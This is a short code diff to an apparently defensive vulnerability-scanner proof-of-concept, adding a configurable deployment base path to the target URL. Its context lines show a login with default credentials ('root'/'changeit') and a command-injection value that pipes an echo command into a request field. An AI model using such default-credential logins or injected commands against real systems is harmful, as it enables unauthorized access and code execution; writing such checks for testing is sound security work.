@@ -27,8 +27,21 @@ class Poc(ABPoc):
 
     def __init__(self):
         super(Poc, self).__init__(Vuln())
-
+        self.option_schema = {
+            'properties': {
+                'base_path': {
+                    'type': 'string',
+                    'description': '部署路径',
+                    'default': '',
+                    '$default_ref': {
+                        'property': 'deploy_path'
+                    }
+                }
+            }
+        }
+                    
     def verify(self):
+        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
         post_data = {'username': 'root', 'password': 'changeit'}
         code_exec = {'line': '1|echo \'vuln\''}
 
